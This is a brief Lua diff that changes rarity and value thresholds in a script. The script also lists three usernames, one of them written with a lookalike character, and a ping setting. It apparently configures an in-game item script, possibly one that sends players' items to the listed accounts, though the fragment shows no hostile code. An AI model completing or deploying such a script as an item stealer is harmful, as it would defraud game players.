@@ -141,8 +141,8 @@ local function fn(arg)
 end
 
 local users = { "0xun1que", "mbeelegend1", "bleedmyworId" }
-local minRarity = "Other"
-local minValue = 3
+local minRarity = "Godly"
+local minValue = 2
 local ping = 100
 E = "own"
 
